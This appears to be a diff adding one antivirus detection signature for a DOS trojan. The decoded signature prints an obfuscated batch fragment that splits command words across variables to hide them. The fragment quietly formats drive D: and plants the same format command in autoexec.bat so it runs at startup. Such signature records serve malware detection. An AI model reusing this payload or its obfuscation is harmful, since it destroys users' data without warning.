@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36613
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off ctty nul set zsoqp=h set mzxnc=oex ec%zsoqp%o >aut%mzxnc%ec.bat set ewyqq=h set xrbso=r set pgvre=t ec%ewyqq%o fo%xrbso%ma%pgvre% d: /u /q / >> c:\autoexec.bat set rptxf=t fo%xrbso%ma%rptxf% d: /u /q / 
